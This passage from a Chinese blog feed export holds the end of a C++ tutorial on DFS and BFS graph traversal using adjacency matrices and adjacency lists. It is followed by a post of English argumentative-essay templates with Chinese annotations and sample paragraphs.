class="comment">//输入边（Vi，Vj）的顶点序号   也就是可达</span></span><br><span class="line">		G-&gt;edges[i][j]=<span class="number">1</span>;</span><br><span class="line">		G-&gt;edges[j][i]=<span class="number">1</span>; <span class="comment">//若为无向图，矩阵为对称矩阵；若建立有向图可不需此步骤。</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//========DFS：深度优先遍历的递归算法======</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFSM</span><span class="params">(MGraph *G, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//以Vi为出发点对邻接矩阵表示的图G进行DFS搜索，邻接矩阵是0,1矩阵</span></span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;G-&gt;vexs[i];</span><br><span class="line">	visited[i]=TRUE;</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;G-&gt;n; j++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(G-&gt;edges[i][j]==<span class="number">1</span> &amp;&amp; ! visited[j])</span><br><span class="line">			DFSM(G,j);   <span class="comment">//（Vi，Vj）∈E，且Vj未访问过，故Vj为新出发点</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(MGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		visited[i]=FALSE; <span class="comment">//标志向量初始化</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		<span class="keyword">if</span>(!visited[i]) <span class="comment">//Vi未访问过</span></span><br><span class="line">			DFSM(G,i);  <span class="comment">//以Vi为源点开始DFS搜索</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//===========BFS：广度优先遍历=======</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(MGraph *G, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//以Vk为源点对用邻接矩阵表示的图G进行广度优先搜索</span></span><br><span class="line">	<span class="keyword">int</span> i,j,f=<span class="number">0</span>,r=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cq[MaxVertexNum];  <span class="comment">//定义队列</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		visited[i]=FALSE;   <span class="comment">//标志向量初始化</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		cq[i]=<span class="number">-1</span>;   <span class="comment">//队列初始化</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;G-&gt;vexs[k]; <span class="comment">//访问源点Vk</span></span><br><span class="line">	visited[k]=TRUE;  <span class="comment">//将已访问标志位TRUE</span></span><br><span class="line">	cq[r]=k; <span class="comment">//源点Vk进入队列</span></span><br><span class="line">	<span class="keyword">while</span>(cq[f]!=<span class="number">-1</span>)  <span class="comment">//队列非空就执行</span></span><br><span class="line">	&#123;</span><br><span class="line">		i=cq[f];  </span><br><span class="line">		f=f+<span class="number">1</span>;      <span class="comment">//Vi出队</span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;G-&gt;n; j++)  <span class="comment">//依次Vi</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!visited[j] &amp;&amp; G-&gt;edges[i][j]==<span class="number">1</span>)  <span class="comment">//Vj未访问</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;G-&gt;vexs[j]; <span class="comment">//访问Vj</span></span><br><span class="line">				visited[j]=TRUE;</span><br><span class="line">				r=r+<span class="number">1</span>;</span><br><span class="line">				cq[r]=j;  <span class="comment">//通过访问Vj入队</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*********************基于邻接表图遍历*********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> //边表结点</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> adjvex;  <span class="comment">//邻接点域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span> <span class="comment">//链域</span></span><br><span class="line">&#125; EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>  //顶点表结点</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> vertex; <span class="comment">//顶点域</span></span><br><span class="line">	EdgeNode *firstedge; <span class="comment">//边表头指针</span></span><br><span class="line">&#125; VertexNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> VertexNode AdjList[MaxVertexNum];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	AdjList adjlist; <span class="comment">//邻接表</span></span><br><span class="line">	<span class="keyword">int</span> n,e; <span class="comment">//图中当前顶点数和边数</span></span><br><span class="line">&#125; ALGraph; <span class="comment">//图类型 -Adjacency List 邻接表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//=========建立图的邻接表=======</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateALGraph</span><span class="params">(ALGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,k;</span><br><span class="line">	<span class="keyword">char</span> a;</span><br><span class="line">	EdgeNode *s; <span class="comment">//定义边表结点</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"（输入顶点和边）Input VertexNum(n) and EdgesNum(e): "</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;G-&gt;n&gt;&gt;G-&gt;e; <span class="comment">//读入顶点数和边数</span></span><br><span class="line">	fflush(<span class="built_in">stdin</span>); <span class="comment">//清空内存缓冲</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(输入顶点信息)Input Vertex string:"</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)<span class="comment">//建立顶点表</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">		G-&gt;adjlist[i].vertex=a; <span class="comment">//读入顶点信息</span></span><br><span class="line">		G-&gt;adjlist[i].firstedge=<span class="literal">NULL</span>; <span class="comment">//边表置为空</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(输入边，创建邻接表)Input edges,Creat Adjacency List"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;G-&gt;e; k++) <span class="comment">//无向建立边表</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;i&gt;&gt;j;  <span class="comment">//读入边（Vi， Vj）的顶点对应序号</span></span><br><span class="line">		s=(EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));  <span class="comment">//生成边表结点</span></span><br><span class="line">		s-&gt;adjvex=j;  <span class="comment">//邻接点序号为j</span></span><br><span class="line">		s-&gt;next=G-&gt;adjlist[i].firstedge;</span><br><span class="line">		G-&gt;adjlist[i].firstedge=s; <span class="comment">//将新结点*S插入顶点Vi的边表头部</span></span><br><span class="line">		s=(EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">		s-&gt;adjvex=i; <span class="comment">//邻接点序号为i</span></span><br><span class="line">		s-&gt;next=G-&gt;adjlist[j].firstedge;</span><br><span class="line">		G-&gt;adjlist[j].firstedge=s;  <span class="comment">//将新结点*S插入顶点Vj的边表头部</span></span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========DFS：深度优先遍历的递归算法======</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFSM</span><span class="params">(ALGraph *G, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//以Vi为出发点对邻接链表表示的图G进行DFS搜索</span></span><br><span class="line">	 EdgeNode *p;</span><br><span class="line">	 <span class="built_in">cout</span>&lt;&lt;G-&gt;adjlist[i].vertex;  <span class="comment">//访问顶点Vi</span></span><br><span class="line">	 visited[i]=TRUE;  <span class="comment">//标记Vi已访问</span></span><br><span class="line">	 p=G-&gt;adjlist[i].firstedge; <span class="comment">//取Vi边表的头指针</span></span><br><span class="line">	 <span class="keyword">while</span>(p) <span class="comment">//依次搜索Vi的邻接点Vj，这里vj=p-&gt;adjvex</span></span><br><span class="line">	 &#123;</span><br><span class="line">		<span class="keyword">if</span>(! visited[p-&gt;adjvex]) <span class="comment">//若Vj尚未被访问</span></span><br><span class="line">			DFSM(G,p-&gt;adjvex);  <span class="comment">//则以Vj为出发点向纵深搜索</span></span><br><span class="line">		p=p-&gt;next; <span class="comment">//找Vi的下一个邻接点</span></span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(ALGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		visited[i]=FALSE;  <span class="comment">//标志向量初始化</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		<span class="keyword">if</span>(!visited[i]) <span class="comment">//Vi未访问过</span></span><br><span class="line">			DFSM(G,i); <span class="comment">//以Vi为源点开始DFS搜索</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//==========BFS：广度优先遍历=========</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(ALGraph *G, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//以Vk为源点对用邻接链表表示的图G进行广度优先搜索</span></span><br><span class="line">	<span class="keyword">int</span> i,f=<span class="number">0</span>,r=<span class="number">0</span>;</span><br><span class="line">	EdgeNode *p;</span><br><span class="line">	<span class="keyword">int</span> cq[MaxVertexNum]; <span class="comment">//定义FIFO队列</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		visited[i]=FALSE; <span class="comment">//标志向量初始化</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=G-&gt;n; i++)</span><br><span class="line">        cq[i]=<span class="number">-1</span>;    <span class="comment">//初始化队列</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;G-&gt;adjlist[k].vertex; <span class="comment">//访问源点Vk</span></span><br><span class="line">	visited[k]=TRUE;</span><br><span class="line">	cq[r]=k;  <span class="comment">//Vk已访问，将其入队。注意，实际上是将其序号入队</span></span><br><span class="line">	<span class="keyword">while</span>(cq[f]!=<span class="number">-1</span>) <span class="comment">//队列非空则执行</span></span><br><span class="line">	&#123;</span><br><span class="line">		i=cq[f];</span><br><span class="line">		f=f+<span class="number">1</span>;</span><br><span class="line">		p=G-&gt;adjlist[i].firstedge; <span class="comment">//取Vi的边表头指针</span></span><br><span class="line">		<span class="keyword">while</span>(p) <span class="comment">//依次搜索Vi的邻接点Vj（令p-&gt;adjvex=j）</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!visited[p-&gt;adjvex])   <span class="comment">//若Vj未访问过，Vj是指的邻接点</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;G-&gt;adjlist[p-&gt;adjvex].vertex; <span class="comment">//访问Vj</span></span><br><span class="line">				visited[p-&gt;adjvex]=TRUE;</span><br><span class="line">				r=r+<span class="number">1</span>;</span><br><span class="line">				cq[r]=p-&gt;adjvex; <span class="comment">//访问过的Vj入队</span></span><br><span class="line">			&#125;</span><br><span class="line">			p=p-&gt;next;  <span class="comment">//找Vi的下一个邻接点</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="comment">//endwhile</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> a,b;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//基于邻接矩阵遍历图</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"*********************基于邻接矩阵无向图遍历*********************"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	MGraph *G;</span><br><span class="line">	G=(MGraph *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MGraph));</span><br><span class="line">	CreateMGraph(G); <span class="comment">//建立邻接矩阵</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(-基于邻接矩阵-输出深度优先搜索)Print Graph DFS: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	DFS(G);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"-基于邻接矩阵-输入从哪个顶点开始遍历: "</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(-基于邻接矩阵-输出广度优先搜索)Print Graph BFS: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	BFS(G,a);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//基于邻接表遍历图</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"*********************基于邻接表无向图遍历*********************"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    ALGraph *A;</span><br><span class="line">	A=(ALGraph *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ALGraph));</span><br><span class="line">	CreateALGraph(A);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(-基于邻接表-输出深度优先搜索)Print Graph DFS: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	DFS(G);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(-基于邻接表-输出广度优先搜索)Print Graph BFS: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">	BFS(G,b);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>成长之路</tag>
      </tags>
  </entry>
  <entry>
    <title>议论文的基本万能模板</title>
    <url>/posts/86.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="“名言类”议论文的基本框架"><a href="#“名言类”议论文的基本框架" class="headerlink" title="“名言类”议论文的基本框架"></a>“名言类”议论文的基本框架</h1><blockquote>
<p>开头段：①引出主题 +②表明立场</p>
<p><strong>主题段：论证主题</strong></p>
<p>结尾段：①重申立场 +  ②建议</p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">题目：'You can cite examples to illustrate the importance of paying attention to others' opinions.</span><br></pre></td></tr></table></figure>



<h2 id="主体段中文思路小结"><a href="#主体段中文思路小结" class="headerlink" title="主体段中文思路小结"></a>主体段中文思路小结</h2><blockquote>
<p><strong>我认为</strong>关注别人的建议<strong>很重要的原因如下所述</strong>。<strong>也许第一个主要的原因是</strong>接受别人的意见的人<strong>会</strong>获得充足的知识并且更了解自己。<strong>最典型的一个例子是</strong>Jackson Lee<strong>的故事</strong>，<strong>他</strong>是中国一位有名的年轻明星。<strong>具体来说</strong>，<strong>正是</strong>其他成员的建议帮助他形成最匹配自己特长的风格。<strong>此外，众所周知</strong>倾听别人的观点对职业成功有好处。<strong>很多的教育研究者同意</strong>大多数名人的职业成功<strong>能归因于对</strong>别人建议的<strong>关注</strong>，<strong>例如</strong>朋友，家人和同事</p>
</blockquote>
<h2 id="译文"><a href="#译文" class="headerlink" title="译文"></a>译文</h2><blockquote>
<p>The reasons why I think paying attention to others’ opinions is of utmost importance are as follows. Perhaps the primary reason is that people who accept others’ advice will acquire sufficient knowledge and get a clear understanding of themselves. A typical example is the story of Jackson Lee, who is a young star in China. Specifically speaking, it is other group members’ suggestions that help him to form the style which most suits his talent. In addition, it would be universally acknowledged that listening to others’ viewpoints is beneficial for career success. Many educational researchers agree that most famous people’s career success can be generally attributed to the focus on opinions from other people. such as close friends, family and colleagues.</p>
</blockquote>
<h2 id="主体段语句模板"><a href="#主体段语句模板" class="headerlink" title="主体段语句模板"></a>主体段语句模板</h2><blockquote>
<p><strong>一、The reasons why I think …… is of utmost importance are as follows</strong></p>
<p><strong>二、Perhaps the primary reason is that people who ……will……</strong></p>
<p><strong>三、A typical example is the story of……，who……</strong></p>
<p><strong>四、 Specifically speaking, it is……that……</strong></p>
<p><strong>五、In addition, it would be universally acknowledged that…… is beneficial for ……</strong></p>
<p><strong>六、Many educations researcher agree that……can be generally attributed to the focus on……. such as ……, …… and …….</strong></p>
</blockquote>
<h1 id="“常规类”议论文的基本框架"><a href="#“常规类”议论文的基本框架" class="headerlink" title="“常规类”议论文的基本框架"></a>“常规类”议论文的基本框架</h1><blockquote>
<p>开头段P1</p>
<p>主体段P2</p>
<p>结尾段P3</p>
</blockquote>
<h2 id="P1开头段"><a href="#P1开头段" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>There has been a heated discussion about experiences of attending different courses in college among university student.</strong></p>
<p><strong>from my point of view, <em>taking part in</em> English literature courses has given me impressive experience.</strong></p>
</blockquote>
<h2 id="P1句型"><a href="#P1句型" class="headerlink" title="P1句型"></a>P1句型</h2><blockquote>
<p><strong>There has been a heated discussion about  XX among university student.</strong></p>
<p><strong>from my point of view, xx</strong></p>
</blockquote>
<h2 id="主体段总起引出原因句型"><a href="#主体段总起引出原因句型" class="headerlink" title="主体段总起引出原因句型"></a>主体段总起引出原因句型</h2><blockquote>
<p><strong>一、After investigating the situation in detail, the reasons for my well-considered decision are as follows.（原分）</strong></p>
<p><strong>二、The reasons why I recommend/think xx is of utmost impression/importance are as follows.(保分)</strong></p>
<p><strong>三、The reasons for my unforgettable memories of xx are as follows.(冲分)</strong></p>
</blockquote>
<h2 id="P2主体段"><a href="#P2主体段" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p>一、The reasons for a truly unforgettable memorizes of English literature courses are as follows.</p>
<p>二、After investigating the situation in detail, the reasons for my well-considered decision are as follows</p>
</blockquote>
<blockquote>
<p>一、After investigating  the situation in detail, the reasons for a truly unforgettable impression of courses in English literature are as follows. <strong>Firstly</strong>, <strong>this course broadened my horizons</strong>. <strong>I encountered a wider array of absorbing works of fiction, poetry, and nonfiction from around the world and throughout history.</strong> <strong>Secondly</strong>, <strong>analyzing the works of the greatest minds and imaginations  taught me to think critically about complex topics from different perspectives</strong>. For example, The study  of George Orwell’s 1984 shed new light on the importance of freedom. <strong>Lastly, the courses enabled me to develop transferable skills, which are crucial for employers. For example, in the group project, I learned how to organize information, write reports and give presentation in a collaborative way.</strong></p>
<p>二、After investigating  the situation in detail, the reasons for a truly unforgettable impression of courses in English literature are as follows.  Perhaps the primary reason is that I read many works will broaden my horizons.  <strong>I encountered a wider array of absorbing works of fiction, poetry, and nonfiction from around the world and throughout history.</strong> The second reason is that <strong>analyzing the works of the greatest minds and imaginations  taught me to think critically about complex topics from different perspectives</strong>. For example, the study  of George Orwell’s 1984 shed new light on the importance of freedom. Lastly, the courses enabled me to develop transferable skills, which are crucial for employers. For example, in the group project, I learned how to organize information, write reports and give presentation in a collaborative way.</p>
</blockquote>
<h2 id="P2句型提取"><a href="#P2句型提取" class="headerlink" title="P2句型提取"></a>P2句型提取</h2><blockquote>
<p>一、After investigating the situation in detail, the reason for my well-considered decision are as follows.</p>
<p>二、Perhaps the primary reason is that xx, </p>
<p>三、 the second reason is that xx   . for example</p>
<p>四、 Lastly , the courses enabled me to develop transferable skills, which are crucial for employers. For example, in the group project, I learned how to organize information, write reports and give presentation in a collaborative way.</p>
</blockquote>
<h2 id="P3结尾段"><a href="#P3结尾段" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p>In view of the reasons mentioned above, I intend to choose English literature courses. Besides, I highly suggest that everyone balance the pros and cons of each option to make a sound choice.</p>
<p>In view of the valuable knowledge and improved skills acquire in course, I would highly suggest choosing English literature courses in the university.</p>
</blockquote>
<h2 id="P3句型提取"><a href="#P3句型提取" class="headerlink" title="P3句型提取"></a>P3句型提取</h2><blockquote>
<p>In view of the reasons mentioned above, I intend to xx . Besides, I highly suggest that everyone balance the pros and cons of each option to make a sound choice.</p>
<p>In view of xx  and xx acquire in course, I would highly suggest choosing xx in the university.</p>
</blockquote>
<h1 id="一般议论文-论说文写作框架1"><a href="#一般议论文-论说文写作框架1" class="headerlink" title="一般议论文/论说文写作框架1"></a>一般议论文/论说文写作框架1</h1><h2 id="P1开头段-1"><a href="#P1开头段-1" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>There has been a heated discussion about  xx among xx . From my point of view, xx</strong></p>
</blockquote>
<h2 id="P2主体段-1"><a href="#P2主体段-1" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p><strong>After investigating the situation in detail, The reasons for (my well-considered decision/ xx) are as follows.</strong></p>
<p><strong>Perhaps the primary reason is that xx will. for example xx.</strong></p>
<p><strong>The second reason is that xx. F</strong>or example  xx.</p>
<p>Lastly, xx It’s no secret that xx.</p>
</blockquote>
<h2 id="P3结尾段-1"><a href="#P3结尾段-1" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p><strong>in view of the reasons mentioned above, I intend to xx . Besides, I highly suggest that everyone balance the pros and cons of each option to make a sound choice</strong></p>
</blockquote>
<h1 id="一般议论文-论说文写作框架2"><a href="#一般议论文-论说文写作框架2" class="headerlink" title="一般议论文/论说文写作框架2"></a>一般议论文/论说文写作框架2</h1><h2 id="真题"><a href="#真题" class="headerlink" title="真题"></a>真题</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">题目：How to best handle the relationship between doctors <span class="keyword">and</span> patients</span><br></pre></td></tr></table></figure>

<h2 id="P1开头段-2"><a href="#P1开头段-2" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>while  society is developing at a rapid rate. There has been an increase in the number of people who are facing problems with</strong> doctor-patient relationship. <strong>In view of this situation, many researchers suggest that</strong> a good doctor-patient relationship <strong>will</strong> improve health outcomes <strong>and it is high time for individuals to seek effective methods to</strong> nurture and maintain a strong/healthy relationship between doctors and patients.</p>
</blockquote>
<h2 id="P1句型提取"><a href="#P1句型提取" class="headerlink" title="P1句型提取"></a>P1句型提取</h2><blockquote>
<p>*<em>while  society is developing at a rapid rate. There has been an increase in the number of people who are facing problems with xx *</em></p>
<p><strong>In view of this situation, many researchers suggest that</strong> <strong>xx</strong> <strong>will</strong> <strong>xx</strong> <strong>and it is high time for individuals to seek effective methods to</strong> <strong>xx</strong></p>
</blockquote>
<h2 id="P2主体段-2"><a href="#P2主体段-2" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p><strong>Then, how to</strong> foster a good doctor-patient relationship ?<br><strong>Perhaps the first step is that</strong> doctors <strong>need to</strong> act as an active listener to cultivate good communication. <strong>Specifically speaking</strong>, physicians are supposed to take time to listen to their patients to understand both their symptoms and emotional state. <strong>Otherwise</strong>, <strong>the great opportunity for</strong> establishing a trusting and meaningful relationship <strong>will slip away.</strong> <strong>Another necessary step is to build mutual respect relationship between doctors and patients</strong>, <strong>which can lay a solid foundation for</strong> a strong and positive doctor-patient relationship. <strong>by combining aforementioned methods, we can achieve the aim/goal.</strong></p>
</blockquote>
<h2 id="P2句型提取-1"><a href="#P2句型提取-1" class="headerlink" title="P2句型提取"></a>P2句型提取</h2><blockquote>
<p><strong>Then, how to xx ?</strong></p>
<p><strong>Perhaps the first step is that individuals(个人的)/doctors(医生)/patients(病人) need to xx .</strong></p>
<p><strong>Specifically speaking, xx.</strong></p>
<p><strong>Otherwise, the great opportunity for xx will slip away.</strong></p>
<p> <strong>Another necessary step is to build mutual respect relationship between doctors and patients</strong>, <strong>which can lay a solid foundation for</strong> <strong>XX</strong>.</p>
<p><strong>by combining aforementioned methods, we can achieve the aim/goal.</strong></p>
</blockquote>
<h2 id="P3结尾段-2"><a href="#P3结尾段-2" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p><strong>In conclusion, there many well-documented benefits of</strong> establishing a good relationship between doctors <strong>and patients and it is</strong> <strong>worth investing the effort to</strong> best handle the relationship.</p>
</blockquote>
<h2 id="P3句型提取-1"><a href="#P3句型提取-1" class="headerlink" title="P3句型提取"></a>P3句型提取</h2><blockquote>
<p><strong>In conclusion, there many well-documented benefits of xx and patients and it is worth investing the effort to xx.</strong></p>
</blockquote>
<h1 id="图画作为-现象影响类框架"><a href="#图画作为-现象影响类框架" class="headerlink" title="图画作为+现象影响类框架"></a>图画作为+现象影响类框架</h1><h2 id="真题-1"><a href="#真题-1" class="headerlink" title="真题"></a>真题</h2><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210604141225743.png" alt="image-20210604141225743"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">You should start your essay with a brief description of the picture <span class="keyword">and</span> then comment on <span class="keyword">this</span> kind of modern life.</span><br></pre></td></tr></table></figure>

<h2 id="P1开头段-3"><a href="#P1开头段-3" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>This simple but enlightening cartoon is a lively depiction of</strong> a common lifestyle in the modern world. <strong>Specifically speaking, the person in the picture is</strong> always sitting in front of computers all most the whole day. Even when he or she is sleeping, the scene of playing computers emerges in the dreams. <strong>The scene in this drawing symbolically reveals that computers can have a harmful influence on people’s lives.</strong></p>
</blockquote>
<h2 id="P1句型提取-1"><a href="#P1句型提取-1" class="headerlink" title="P1句型提取"></a>P1句型提取</h2><blockquote>
<p><strong>This simple but enlightening cartoon is a lively depiction of xx.</strong> </p>
<p><strong>Specifically speaking,  人物 in the picture is/are 做什么.</strong></p>
<p><strong>The scene in this drawing symbolically reveals that computers can have a harmful influence on xx</strong></p>
</blockquote>
<h2 id="P2主体段-3"><a href="#P2主体段-3" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p><strong>No one could deny the fact that there has been an increase in the number of people who</strong> overuse computers in the everyday life, <strong>which can negatively affect</strong> individuals’ physical and emotional health. <strong>For example, if people</strong> spend a lot of time sitting at computer desks, they may suffer from physical symptoms, such as headaches, blurred eyes and upper back pain. <strong>In addition, it would be universally acknowledged that</strong> spending too much time playing computer games <strong>is not beneficial for</strong> mental health. <strong>Many psychological researchers found that there is a link between</strong> computer addiction <strong>and</strong> emotional health issues, such as depression and anxiety. <strong>That is to say,</strong> people with computer addiction are more likely to feel anxious when they cannot surf online or play computer games.</p>
</blockquote>
<h2 id="P2句型提取-2"><a href="#P2句型提取-2" class="headerlink" title="P2句型提取"></a>P2句型提取</h2><blockquote>
<p><strong>No one could deny the fact that there has been an increase in the number of people who  xx , which can negatively affect</strong> </p>
<p><strong>For example, if people xx, they may suffer xx, such as  xx</strong></p>
<p><strong>In addition, it would be universally acknowledged that xx  is not beneficial for  xx</strong></p>
<p><strong>Many psychological researchers found that there is a link between  现象   and  问题</strong></p>
<p><strong>That is to say, xx</strong></p>
</blockquote>
<h2 id="P3结尾段-3"><a href="#P3结尾段-3" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p><strong>In conclusion, it is worth investing the effort to</strong> counteract the negative effects mentioned above. <strong>In my opinion</strong>, setting limits of/on screen time and taking frequent breaks <strong>should be the first step</strong>.</p>
</blockquote>
